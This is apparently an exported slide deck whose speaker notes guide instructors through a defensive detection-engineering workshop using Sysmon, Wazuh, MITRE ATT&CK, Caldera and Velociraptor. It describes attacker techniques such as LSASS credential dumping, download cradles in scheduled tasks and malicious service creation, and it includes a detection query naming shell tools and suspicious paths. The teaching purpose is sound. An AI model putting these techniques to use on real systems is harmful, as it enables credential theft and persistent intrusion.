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6" r:id="rId4"/>
    <p:sldMasterId id="214748372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Roboto"/>
      <p:regular r:id="rId51"/>
      <p:bold r:id="rId52"/>
      <p:italic r:id="rId53"/>
      <p:boldItalic r:id="rId54"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Space Grotesk Light"/>
      <p:regular r:id="rId55"/>
      <p:bold r:id="rId56"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Space Grotesk Medium"/>
      <p:regular r:id="rId57"/>
      <p:bold r:id="rId58"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Space Grotesk"/>
      <p:regular r:id="rId59"/>
      <p:bold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SpaceGrotesk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regular.fntdata"/><Relationship Id="rId50" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide44.xml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5.xml"/><Relationship Id="rId55" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/SpaceGroteskLight-regular.fntdata"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide4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7.xml"/><Relationship Id="rId57" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/SpaceGroteskMedium-regular.fntdata"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide6.xml"/><Relationship Id="rId56" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/SpaceGroteskLight-bold.fntdata"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide9.xml"/><Relationship Id="rId59" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/SpaceGrotesk-regular.fntdata"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide8.xml"/><Relationship Id="rId58" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/SpaceGrotesk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aa70f1d9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aa70f1d9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aa70f1d962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aa70f1d962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aa70f1d962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3aa70f1d962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aa70f1d962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aa70f1d962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aa70f1d962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aa70f1d962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aa70f1d962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aa70f1d962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"Detection Engineering is the hidden trick. Everyone focuses on prevention—firewalls, antivirus, patches. But adversaries WILL get in. When they do, can you see them? That's detection.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learn to think like adversaries, map their capabilities, and build detections that actually work in the real world."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aa70f1d962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aa70f1d962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"This is your process. Every detection you build today will follow this cycle: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First, understand the threat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Figure out what logs you have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Form a hypothesis: 'I think I can detect this by looking at X'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Write the rule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TEST IT—this is critical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Deploy and monitor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Tune when needed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Bad detection engineers skip testing. You won't."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aa70f1d962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aa70f1d962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"Not all detections are created equal. Some things are easy to detect—like known malware hashes. Some are hard—like detecting a skilled attacker living off the land.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focus on the middle: pattern and behavior-based detection. That's where the real skill is."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aa70f1d962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aa70f1d962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"Your detection is only as good as your data sources. If you can't see it, you can't detect it.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Today, we're focusing on Windows endpoints because that's where most attacks happen. And our primary weapon is Sysmon."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a70f1d962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aa70f1d962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Live Demo - Sysmon Event Exploration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1: Show Sysmon Events in Wazuh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1. Wazuh → Security Events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2. Add filter: data.win.system.channel is "Microsoft-Windows-Sysmon/Operational"</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="ABB2BF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3. Show the variety of events flowing in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"Look at this stream. Every process, every network connection, every file creation—Sysmon sees it all. This is your raw intelligence."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2: Deep Dive on Event ID 1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1. Filter: rule.id is "61603" (Sysmon Event ID 1)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2. Click on any event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3. Expand and show fields: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   - data.win.eventdata.image (What process?)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   - data.win.eventdata.commandLine (How was it called?)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   - data.win.eventdata.parentImage (Who spawned it?)</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="ABB2BF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   - data.win.eventdata.user (Who ran it?)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"Event ID 1 is process creation. This is GOLD for detection. See these fields? This tells us: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WHAT ran (Image)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 it was called (CommandLine)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WHO spawned it (ParentImage)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WHICH user (User)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Many attacks can be detected just by watching process creation with the right logic."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"Memorize these Event IDs. They'll be your daily tools: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 1: Process creation—detects malware execution, suspicious commands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 3: Network connections—detects C2 communication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 11: File creation—detects ransomware, dropped files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 13: Registry changes—detects persistence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 22: DNS queries—detects malicious domains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Master these five, and you can detect 80% of common attacks."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aa70f1d962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3aa70f1d962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Check detection_examples.md</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en"/>
            </a:br>
            <a:br>
              <a:rPr lang="en"/>
            </a:b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"Let me show you the four types of detection logic we use. Open this reference document—you'll need it all day."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Walk through each example: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Signature-Based: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is the easiest. 'If you see mimikatz.exe, alert.' Simple, right? But what if the attacker renames it to svchost.exe? Detection fails. That's why we need more sophisticated approaches."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Pattern-Based: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"Here we're looking for PATTERNS of behavior. PowerShell downloading and executing something is suspicious even if we don't know the exact file name. This is harder to evade."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Anomaly-Based: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detects weird behavior. If a process suddenly spawns 50 child processes, that's weird. Could be a fork bomb, could be ransomware. The key is knowing what's NORMAL first."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Behavior-Based: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is the most advanced. We're looking at chains of activity. Credential dumping followed by lateral movement? That's a red flag. This requires correlation across multiple events."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aa70f1d962_0_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3aa70f1d962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"Let me tell you what separates good detection engineers from bad ones: testing and false positive management.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detection that fires 1000 times a day on normal activity is WORSE than no detection. Why? Because analysts will ignore it, and the real attack will get lost in the noise.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 rule we write today, we TEST. We validate. We tune. That's the discipline."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aa70f1d962_0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3aa70f1d962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"Alright, now we understand HOW to detect. But WHAT should we detect? That's where threat intelligence comes in.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Imagine you're defending a castle. Would you rather know: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Random facts about medieval weapons, OR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exact tactics your enemy used to conquer the last 10 castles?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threat intelligence. Learning from actual adversary behavior."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aa70f1d962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3aa70f1d962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"MITRE ATT&amp;CK is your bible. It's a giant matrix of real-world adversary techniques, built from thousands of incidents.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Here's how it works: Tactics are the 'WHY'—why is the adversary doing this? Techniques are the 'WHAT'—what are they doing? Procedures are the 'HOW'—exactly how do they do it?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Let's look at a real example..."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aa70f1d962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aa70f1d962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Live Demo - Navigate MITRE ATT&amp;CK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1: Open MITRE ATT&amp;CK Website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1. Open browser to: https://attack.mitre.org/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2. Click "Matrices" → "Enterprise"</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="ABB2BF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3. Show the full matrix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is the ATT&amp;CK matrix for enterprise environments. Each column is a tactic—a stage of the attack. Each cell is a technique."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2: Deep Dive on T1003 - Credential Dumping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1. Find "Credential Access" column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2. Click on "OS Credential Dumping" (T1003)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3. Show the technique page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4. Scroll through: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   - Description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   - Sub-techniques (highlight T1003.001 - LSASS Memory)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   - Procedure Examples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B2BF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>   - Mitigations</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="ABB2BF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   - Detection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"Look at this page. MITRE tells us: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 adversaries dump credentials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WHICH groups use this technique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 to detect it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 to mitigate it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Under 'Detection' section, it says: 'Monitor for unexpected processes interacting with lsass.exe.'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our detection requirement! Now we know what to look for."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aa70f1d962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3aa70f1d962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"These 14 tactics represent the full adversary lifecycle. You need to detect at MULTIPLE stages.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Why? Because if you only detect at Initial Access, and they get through, you're blind. Defense in depth means detecting at execution, persistence, credential access, lateral movement—everywhere.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Today we'll focus on the middle stages because that's where most attacks get noisy and detectable."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aa70f1d962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3aa70f1d962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Present Slide 16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"I've selected 6 techniques we're going to detect today. These aren't random—these are the most common techniques seen in real attacks.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By the end of today, you'll have working detection rules for all six."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For each technique, explain briefly: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T1059.001 - PowerShell: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"PowerShell is everywhere in attacks. It's built into Windows, trusted by defenders, powerful for attackers. Detecting malicious PowerShell is critical."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T1003.001 - LSASS Dumping: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is how attackers steal credentials from memory. If you see this, someone is trying to get passwords or hashes."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T1055 - Process Injection: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"Injecting code into another process to hide. Malware's favorite evasion technique."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T1047 - WMI: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"Windows Management Instrumentation—legitimate admin tool, abused for remote execution and lateral movement."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T1053.005 - Scheduled Tasks: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"Creating scheduled tasks for persistence. 'Run my backdoor every hour even if I'm not here.'"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T1543.003 - Service Creation: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"Creating Windows services for persistence and privilege escalation."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3aa70f1d962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3aa70f1d962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"This is the process you'll use over and over in your career. Threat intel → ATT&amp;CK → Procedure → Detection indicators → Rule → Testing.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 me show you a real example."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Check threat_to_detection_example.md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**What to say:**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&gt; "Open this document. This is a complete real-world example of the process. Study it—this is exactly how professional detection engineers work.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&gt; Notice: we start with threat intel, map to ATT&amp;CK, extract indicators, write rules, and then TEST. Testing is non-negotiable."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aa70f1d962_0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3aa70f1d962_0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**What to say:** &gt; "Testing detection rules manually is tedious. 'Let me run this command... wait... check Wazuh... run another command...' &gt; &gt; What if we could automate realistic attacks? That's Caldera. &gt; &gt; Caldera runs complete adversary campaigns automatically. It executes real ATT&amp;CK techniques, chains them together, and generates authentic logs. It's like having a red team working for you 24/7." </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en"/>
            </a:br>
            <a:br>
              <a:rPr lang="en"/>
            </a:b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"Agents are Caldera's implants on target machines. In a real engagement, these would be your C2 beacons. For us, they're how Caldera executes attacks on your endpoints.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should see agents from participant machines here. If not, we'll troubleshoot."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Check: Do participants have Caldera agents?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not already deployed, you'll need to deploy Caldera agents. Here's the quick deployment script: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Check: caldera_operation_guide.md</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en"/>
            </a:br>
            <a:br>
              <a:rPr lang="en"/>
            </a:br>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Live Demo - Run Operation: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do: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Share screen showing both Caldera and Wazuh side-by-side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Create operation as described in guide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Start it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Narrate what's happening in real-time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Show corresponding logs appearing in Wazuh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"Watch this. I'm starting an operation called 'Hunter.' This adversary profile contains discovery and credential access techniques.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[Start operation]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 these 'Potential Links'? Each one is an ATT&amp;CK technique Caldera is about to execute. Watch...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[Wait for first ability to execute]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There! It just ran 'whoami'. Now let's find that in Wazuh...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[Switch to Wazuh, search for recent whoami.exe]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See? From attack to detection in real-time. This is the full pipeline."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Participant Exercise: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"Your turn. Follow the guide I just shared. Create your own operation, run it for 5 minutes, then find at least THREE different Sysmon events in Wazuh that correspond to Caldera abilities.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Screenshot all three. This proves you understand the attack → log → detection flow.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15 minutes. Go!"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Walk around and assist. Common issues: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Agents not connected (deployment issue)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Operation not starting (wrong group selected)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Can't find logs (wrong time filter in Wazuh)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3aa70f1d962_0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3aa70f1d962_0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 (Slide 19):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"Log analysis is detective work. You're looking at thousands of events trying to find the one malicious needle in the haystack.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Good analysts develop pattern recognition—they can spot anomalies quickly. But it takes practice. That's what we're doing now."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aa70f1d962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aa70f1d962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 (Slide 20):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"Use the 5W1H method for EVERY suspicious event you investigate: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WHO did it?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WHAT happened?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WHEN did it occur?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WHERE did it happen?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WHY did it happen?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 was it done?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Answer these six questions and you'll understand any security event."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Live Demo - 5W1H Analysis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1: Find a real Sysmon event in Wazuh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1. Go to Wazuh → Security Events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2. Filter: rule.id is 61603 (Sysmon Event ID 1)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3. Pick any recent PowerShell execution</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="ABB2BF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4. Click to expand all fields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2: Apply 5W1H on screen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"Let's analyze this PowerShell event together using 5W1H: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[Point to fields while speaking]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WHO? Look at 'data.win.eventdata.user' → NT AUTHORITY\SYSTEM WHAT? Look at 'data.win.eventdata.image' → powershell.exe executed WHEN? Look at 'timestamp' → [read timestamp] WHERE? Look at 'agent.name' → [read hostname] WHY? This is interpretation → Running as SYSTEM is unusual for user activity HOW? Look at 'data.win.eventdata.parentImage' → Spawned by taskeng.exe (scheduled task)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I know the full story: A scheduled task ran PowerShell as SYSTEM at this time. Is it malicious? Need more context—what was the command line?"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aa70f1d962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3aa70f1d962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is the scientific method applied to detection. We don't just guess—we observe, form hypotheses, test them, and refine.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Bad detection engineers write rules based on hunches. Good ones validate their hypotheses with data."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aa70f1d962_0_1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3aa70f1d962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Highlight Scenario 1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"Let's build our first real detection rule together. Scenario 1: Malicious PowerShell Execution.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know from threat intel that attackers love PowerShell. They use encoded commands to hide payloads, and download cradles to fetch malware. Let's detect that.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Instructor Live Demo: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do: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Share all the scripts from the scenario document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Run the master attack script on YOUR screen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Show the logs appearing in Wazuh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Create the detection rules LIVE in Wazuh GUI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Restart Wazuh manager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Run attacks again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Show the alerts firing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 during demo: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"Watch me do this once, then you'll do it yourselves.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[Run attack script]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First, I generate the attacks. See these PowerShell windows? Each one is a different attack technique.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[Go to Wazuh, find the logs]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are the raw logs. No alerts yet because we haven't written the rules.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[Navigate to Rules management]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I create the detection rules. See how I'm matching on specific command-line patterns? That's the detection logic.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[Save and restart]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Rules deployed. Now let's test...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[Run attacks again]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[Show alerts firing]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BOOM! Detections! See these high-severity alerts? We just caught three different PowerShell attack techniques. This is detection engineering in action."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Participant Exercise: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"Your turn. You have 20 minutes to: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Run the attack scripts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Analyze the logs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Create the detection rules in YOUR Wazuh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Test and validate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Screenshot your working alerts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hands-on keyboard time. I'll walk around to help. Don't skip the testing—that's the most important part!"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Walk around and assist. Common issues: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XML syntax errors (missing brackets, typos)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Rules not loading (forgot to restart)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Can't find alerts (wrong time filter, wrong rule ID)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Attack script errors (execution policy, permissions)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Scenario 2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Instructor Live Demo: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"Credential dumping is the #1 post-exploitation technique. If you detect this, someone is trying to steal passwords. Let me show you what it looks like..."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do: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Run the master attack script (AS ADMINISTRATOR) on your demo machine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Show the raw Sysmon Event ID 10 logs in Wazuh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Point out the key fields: SourceImage, TargetImage, GrantedAccess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Deploy the detection rules live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Re-run attacks and show alerts firing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Emphasize severity levels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"See that alert? Level 15—CRITICAL. When you see this in production, it's all hands on deck. Someone is dumping credentials.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Notice the GrantedAccess field: 0x1410. That's read memory permission. No legitimate user process needs to read LSASS memory. This is credential theft, period."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Participant Exercise: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"Your turn. You have 20 minutes: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Download and run the attack scripts (AS ADMIN!)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Find the Sysmon Event ID 10 logs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Deploy the credential dumping detection rules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Test and validate your alerts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Screenshot your highest-severity alert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Remember: Run PowerShell as Administrator or these attacks won't work. If you're not admin, raise your hand."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Scenario 3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Instructor Live Demo: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do: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Run the master attack script on screen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Show each type of scheduled task being created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Navigate to Wazuh and show the raw Sysmon Event ID 1 logs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Point out the /create flag and suspicious command lines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Deploy the detection rules live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Re-run attacks and show multiple rules firing for single attack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Emphasize rule stacking (multiple rules = higher confidence)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"Persistence is how attackers maintain access. They want to survive reboots, survive detection, survive you kicking them out.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Watch this: I'm creating a scheduled task that runs PowerShell every 6 hours to download malware. This is EXACTLY what ransomware does.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[Show the schtasks command in Wazuh]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See that command line? /create /tn /tr with PowerShell and a download cradle. That's persistence + execution in one.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rules catch this at multiple levels. Rule 100300 says 'task created'—informational. Rule 100303 says 'download cradle in task'—CRITICAL. That's layered detection."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Participant Exercise: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"Final exercise for this section. You have 20 minutes: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Run all four scheduled task attacks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Find the Sysmon logs for each one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Deploy the persistence detection rules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Test and validate—you should see multiple alerts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Screenshot the HIGHEST severity alert (rule 100303)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Bonus challenge: Use Velociraptor to hunt for scheduled tasks. See what legitimate tasks are on your system. Document 3 of them.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Go!"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3aa70f1d962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3aa70f1d962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3aa8f7c0859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3aa8f7c0859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aa8f7c0859_0_1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3aa8f7c0859_0_1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/>
              <a:t>Scenario 4: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Instructor Demo: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do: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Run the master injection script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Show Event ID 8 and 10 in Wazuh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Explain source vs target process relationship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Deploy rules and show alerts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Emphasize this detects advanced malware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"Process injection is what separates basic malware from advanced threats. Basic malware runs 'badware.exe'—easy to detect. Advanced malware injects into 'explorer.exe'—much harder.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Sysmon sees it. Event ID 8 logs CreateRemoteThread. Event ID 10 logs process access. Our rules catch the suspicious patterns.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When you see this alert in production, you're dealing with sophisticated malware. Time to escalate."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Participant Exercise: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"You have 20 minutes. Run the injection attacks, deploy the rules, validate your detections. Screenshot the highest-severity alert."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/>
              <a:t>Scenario 5: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Instructor Demo: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do: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Run WMI attack scripts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Show the parent-child relationship in Wazuh (WmiPrvSE.exe → powershell.exe)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Explain why this is suspicious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Deploy rules and show alerts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Emphasize the lateral movement use case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"WMI is everywhere in Windows environments. IT admins use it daily. That's exactly why attackers love it—it blends in.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look at this process tree. WmiPrvSE.exe spawned PowerShell with an encoded command. That's NOT normal admin activity. That's an attacker moving laterally or executing malware.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detection doesn't block WMI—that would break legitimate tools. Instead, we detect the PATTERNS that indicate malicious use."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Participant Exercise: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"You have 20 minutes. Run the WMI attacks, find the logs showing WmiPrvSE.exe as parent, deploy the rules, validate alerts. Screenshot rule 100505—that's our highest confidence WMI detection."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/>
              <a:t>Scenario 6:</a:t>
            </a:r>
            <a:br>
              <a:rPr b="1" lang="en"/>
            </a:br>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Instructor Demo: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"Services are the crown jewel of persistence. Once an attacker creates a malicious service, they're in your environment until you find and remove it. It runs every boot, as SYSTEM, with full privileges.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Watch this: I'm creating a service that runs PowerShell from the TEMP directory. Two massive red flags in one command."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do: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Run service creation attacks (AS ADMIN)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Show sc.exe command in Wazuh logs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Extract the binPath from the command line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Deploy rules and show critical alerts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Use Velociraptor to show how to hunt existing services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Participant Exercise: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"Final hands-on exercise. 20 minutes. Run the service attacks AS ADMINISTRATOR, deploy the rules, get your alerts. Screenshot rule 100601—that's our highest-priority service detection."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aa8f7c0859_0_1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3aa8f7c0859_0_1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3aa8f7c0859_0_1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3aa8f7c0859_0_1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3aa8f7c0859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3aa8f7c0859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3aa8f7c0859_0_1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3aa8f7c0859_0_1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is the scientific method applied to detection. We don't just guess—we observe, form hypotheses, test them, and refine.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Bad detection engineers write rules based on hunches. Good ones validate their hypotheses with data."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Instructor Demo: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"This is where detection engineering becomes art. We've detected 30+ individual techniques. Now we connect them into stories.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Watch: I'm going to simulate a real attack chain. PowerShell downloads malware, dumps credentials, moves laterally. Each stage triggers its own alert. But the correlation rule sees the PATTERN and fires one critical alert: 'Active breach in progress.'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the alert that wakes up the SOC manager at 3 AM."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do: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Deploy correlation rules on screen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Run the test_correlation_attack_chain.ps1 script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Show individual alerts appearing in Wazuh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Wait for correlation alert to fire (may take 30-60 seconds for processing)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Show the correlation alert with CRITICAL severity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Click into it and show the linked events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"See that? Four separate events, but ONE critical correlation alert. That's context. That's intelligence. That's what makes a great detection engineer."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3aa8f7c0859_0_1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3aa8f7c0859_0_1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TESTING: THE MOST CRITICAL PHASE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Testing Pyramid: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UNIT TESTING (Individual rule)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→ Does it catch the attack?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→ Proper field matching?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INTEGRATION TESTING (Rule combinations)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→ Do correlation rules work?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→ Proper event sequencing?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 FALSE POSITIVE TESTING (Production simulation)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→ Does it fire on normal activity?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→ Acceptable noise level?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 EVASION TESTING (Attacker perspective)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→ Can it be bypassed?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→ Alternative detection methods?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Never deploy untested rules to production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aa8f7c0859_0_1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3aa8f7c0859_0_1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3aa8f7c0859_0_1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3aa8f7c0859_0_1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"This is the process you'll use over and over in your career. Threat intel → ATT&amp;CK → Procedure → Detection indicators → Rule → Testing.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 me show you a real example."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Check threat_to_detection_example.md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**What to say:**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&gt; "Open this document. This is a complete real-world example of the process. Study it—this is exactly how professional detection engineers work.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&gt; Notice: we start with threat intel, map to ATT&amp;CK, extract indicators, write rules, and then TEST. Testing is non-negotiable."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3aa8f7c0859_0_1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3aa8f7c0859_0_1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3aa8f7c0859_0_2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3aa8f7c0859_0_2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3aa8f7c0859_0_2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3aa8f7c0859_0_2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Live Demo - Velociraptor Hunting Interface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1: Navigate to Hunt Manager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1. Velociraptor → Click "Hunt Manager" (left sidebar)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2. Show existing hunts (if any)</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="ABB2BF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3. Click "+ New Hunt"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"Hunt Manager is where you launch queries across your fleet. Each hunt targets specific endpoints and collects specific artifacts."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2: Browse Available Artifacts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1. In the artifact selector, search for: "Windows.System.TaskScheduler"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2. Show the artifact description</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="ABB2BF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3. Explain: "Artifacts are pre-built forensic collections. MITRE has created hundreds."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3: Create a Simple Hunt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1. Select artifact: "Windows.System.TaskScheduler"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2. Target: Select all clients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3. Launch hunt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4. Wait 30 seconds for results</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="ABB2BF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5. Click "Notebook" to view results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"In 30 seconds, we just collected every scheduled task from every endpoint. Now we analyze. Look for tasks from unusual locations, tasks running scripts, recently created tasks."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4: Analyze Results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1. In the notebook, scroll through results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2. Point out columns: Name, Path, Command, Enabled, LastRunTime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3. Filter in the notebook: Click "Add Cell" → VQL query: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   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ABB2BF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>   SELECT * FROM source()</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="ABB2BF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BB2BF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>   WHERE Path =~ 'powershell|cmd|temp|appdata'</a:t>
            </a:r>
            <a:endParaRPr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"See that? I just filtered 500 scheduled tasks down to the 5 that run PowerShell or CMD from suspicious locations. That's hunting. Finding needles in haystacks."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3aa8f7c0859_0_2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3aa8f7c0859_0_2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do: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Share the hunting exercises document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Demonstrate Exercise 1 live (PowerShell hunting)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Set the 45-minute timer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Walk around helping participants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"You have 45 minutes for 5 hunting exercises. That's 9 minutes each. This is fast-paced, real-world hunting.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 the document as your guide. Each exercise has a hypothesis, hunting approach, and expected results. Your goal: find threats, document findings, identify detection gaps.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I'll be walking around to help. Start with Exercise 1. Go!"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Walk around and assist participants with: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VQL query syntax issues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Finding artifacts in Velociraptor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Interpreting results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Correlating between Velociraptor and Wazuh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Time management (keep them moving through exercises)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[0:65-0:75] Hunting Debrief &amp; Discussion (10 min)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After 45 minutes, call time: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"Time! Let's debrief. Even if you didn't finish all five exercises, that's okay. Threat hunting takes practice.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discuss what you found."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Facilitate discussion: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Questions to ask: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"Who found suspicious PowerShell executions? What made them suspicious?"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Get 2-3 participants to share findings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Discuss indicators: encoded commands, download cradles, hidden windows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"Did anyone find scheduled tasks or services from TEMP or AppData?"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Should find their own testing artifacts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Discuss why these locations are red flags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"What about network connections—anything unusual?"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Discuss PowerShell/WMI making external connections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Talk about baseline vs. anomaly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"Show of hands—who identified detection gaps? Rules that SHOULD have fired but didn't?"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is critical learning: hunting reveals gaps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Discuss importance of creating rules from hunting findings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"What was the hardest part of hunting?"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Common answers: VQL syntax, too much data, distinguishing benign from malicious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Validate these challenges and discuss strategies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Key Teaching Points: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"Here's what makes a great threat hunter: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Hypothesis-Driven:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> You don't browse aimlessly. You hunt with purpose.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Systematic:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> You document everything, even false positives.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Pattern Recognition:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> You learn what's normal so you can spot what's not.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Persistent:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> You don't stop at the first finding—you keep digging.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Actionable:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Every hunt produces output: detections, mitigations, or knowledge.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Hunting isn't a one-time activity. It's a discipline. Schedule regular hunts. Weekly, monthly—whatever your resources allow. Each hunt makes you better."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3aa8f7c0859_0_2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3aa8f7c0859_0_2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3aa8f7c0859_0_2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3aa8f7c0859_0_2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aa8f7c0859_0_2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3aa8f7c0859_0_2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3aa8f7c0859_0_2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3aa8f7c0859_0_2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What to do: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Share the hunting exercises document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Demonstrate Exercise 1 live (PowerShell hunting)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Set the 45-minute timer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Walk around helping participants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"You have 45 minutes for 5 hunting exercises. That's 9 minutes each. This is fast-paced, real-world hunting.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Use the document as your guide. Each exercise has a hypothesis, hunting approach, and expected results. Your goal: find threats, document findings, identify detection gaps.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I'll be walking around to help. Start with Exercise 1. Go!"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Walk around and assist participants with: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VQL query syntax issues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Finding artifacts in Velociraptor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Interpreting results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Correlating between Velociraptor and Wazuh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Time management (keep them moving through exercises)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[0:65-0:75] Hunting Debrief &amp; Discussion (10 min)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After 45 minutes, call time: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"Time! Let's debrief. Even if you didn't finish all five exercises, that's okay. Threat hunting takes practice.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Let's discuss what you found."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Facilitate discussion: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Questions to ask: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"Who found suspicious PowerShell executions? What made them suspicious?"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Get 2-3 participants to share findings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Discuss indicators: encoded commands, download cradles, hidden windows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"Did anyone find scheduled tasks or services from TEMP or AppData?"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Should find their own testing artifacts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Discuss why these locations are red flags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"What about network connections—anything unusual?"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Discuss PowerShell/WMI making external connections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Talk about baseline vs. anomaly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"Show of hands—who identified detection gaps? Rules that SHOULD have fired but didn't?"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is critical learning: hunting reveals gaps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Discuss importance of creating rules from hunting findings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"What was the hardest part of hunting?"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Common answers: VQL syntax, too much data, distinguishing benign from malicious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Validate these challenges and discuss strategies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Key Teaching Points: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"Here's what makes a great threat hunter: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Hypothesis-Driven:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> You don't browse aimlessly. You hunt with purpose.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Systematic:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> You document everything, even false positives.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Pattern Recognition:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> You learn what's normal so you can spot what's not.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Persistent:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> You don't stop at the first finding—you keep digging.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Actionable:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Every hunt produces output: detections, mitigations, or knowledge.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Hunting isn't a one-time activity. It's a discipline. Schedule regular hunts. Weekly, monthly—whatever your resources allow. Each hunt makes you better."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3aa8f7c0859_0_2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3aa8f7c0859_0_2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3aa8f7c0859_0_2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3aa8f7c0859_0_2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3aa8f7c0859_0_2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3aa8f7c0859_0_2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Instructor Actions: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"I'm sharing a complete report template. This is what a professional detection engineering report looks like.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20 minutes. Your task: Fill out as much of this template as you can with YOUR findings from today.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Focus on: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Executive Summary (what did you accomplish?)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Technical Findings (which rules did you create and test?)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Threat Hunting Findings (what did you discover?)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Recommendations (what would you do next?)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Don't try to fill out EVERYTHING—that would take hours. But complete the main sections with your actual data from today.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becomes your portfolio piece. When you interview for detection engineering roles, you show them THIS."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Share the template and set 20-minute timer.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Walk around and help participants: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Structure their findings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Write clear executive summaries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Document technical details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Articulate recommendations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[0:25-0:35] Report Presentations (10 min)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"Time! I want 3 volunteers to present a 2-minute summary of their report. Think of this as presenting to your CISO.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Focus on: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What you built (detection rules)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What you found (hunting results)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What you recommend (next steps)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Who wants to go first?"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Select 3 participants to present. Give each 2 minutes.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After each presentation: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Provide positive feedback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Highlight what they did well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Offer one improvement suggestion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 after presentations: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"Excellent presentations! Notice how each of you told a story: what you did, what you found, what matters. That's how you communicate technical work to non-technical audiences.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here has a report they can refine and use. This is your proof of skills. This is what separates you from people who just talk about detection engineering."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[0:35-0:45] Workshop Wrap-Up &amp; Next Steps (10 min)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Present Slides 40-42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 (Slide 40):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"Let's talk metrics. In the real world, you'll be asked: 'How effective is our detection program?'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need numbers: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 many ATT&amp;CK techniques do you cover?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What's your false positive rate?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 fast do you detect threats?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 many threats did you find through hunting?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Track these. Report them. Show continuous improvement. That's how you demonstrate value."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What to say (Slide 41):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"Look at what you've accomplished in 8 hours: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40+ production-ready detection rules ✅ 6 major ATT&amp;CK techniques covered ✅ Real attack simulations tested ✅ Threat hunting methodology learned ✅ Correlation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4" name="Google Shape;14;p2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15" name="Google Shape;15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23" name="Google Shape;23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31" name="Google Shape;31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50" name="Google Shape;50;p3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51" name="Google Shape;51;p3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4" name="Google Shape;54;p4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55" name="Google Shape;55;p4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9" name="Google Shape;59;p4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60" name="Google Shape;60;p4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1" name="Google Shape;61;p4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4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7" name="Google Shape;67;p5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69" name="Google Shape;69;p5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70" name="Google Shape;70;p5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6" name="Google Shape;76;p5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7" name="Google Shape;77;p5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8" name="Google Shape;78;p5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6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81" name="Google Shape;81;p6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85" name="Google Shape;85;p6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86" name="Google Shape;86;p6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8" name="Google Shape;88;p6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1" name="Google Shape;91;p7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92" name="Google Shape;92;p7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99" name="Google Shape;99;p7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p7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05" name="Google Shape;105;p7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7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9" name="Google Shape;109;p8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8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" name="Google Shape;116;p8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17" name="Google Shape;117;p8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8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19" name="Google Shape;119;p8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0" name="Google Shape;120;p8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21" name="Google Shape;121;p8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4" name="Google Shape;124;p9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9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9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7" name="Google Shape;127;p9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8" name="Google Shape;128;p9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9" name="Google Shape;129;p9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0" name="Google Shape;130;p9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" name="Google Shape;131;p9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2" name="Google Shape;132;p9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3" name="Google Shape;133;p9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34" name="Google Shape;134;p9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35" 